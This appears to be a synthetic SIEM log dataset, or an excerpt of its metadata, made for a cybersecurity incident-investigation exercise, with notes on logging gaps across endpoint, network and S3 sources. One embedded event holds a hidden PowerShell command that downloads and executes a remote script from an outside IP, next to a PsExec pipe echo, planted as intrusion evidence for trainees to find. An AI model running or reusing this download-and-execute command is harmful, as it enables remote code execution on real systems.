metadata.note: SYNTHETIC data generated for the Deloitte Cyber 'Incident Investigation Intelligence' assignment. The assignment's siem_logs.json was not included in the material received, so this faithful stand-in was generated to the schema described in the brief. All hosts, users, IPs, and events are fictional. A multi-stage intrusion is embedded within background noise.
metadata.event_id_scheme: EP=endpoint, AU=auth, NW=network, CS=cloud_storage; zero-padded, chronological per source

endpoint.description: EDR process/file telemetry from Windows endpoints and servers.
endpoint.coverage_note: No EDR agent is deployed on SRV-SQL01 (known gap).

network.coverage_note: No DNS query logs and no web-proxy/URL logs are collected (known gap).

cloud_storage.description: AWS S3 data-plane access logs (CloudTrail-style) for the PHI estate.
cloud_storage.coverage_note: Per-object size logging is only partially enabled; some rows have bytes=null.

asset_inventory_hint.note: Provided so correlation can resolve host<->IP. In a real SIEM this comes from CMDB.

events.command_line: cmd.exe /c echo NnJ8 > \\.\pipe\PSEXESVC & powershell -nop -w hidden -c "iex(iwr http://45.83.140.77/s.ps1 -UseBasicParsing)"
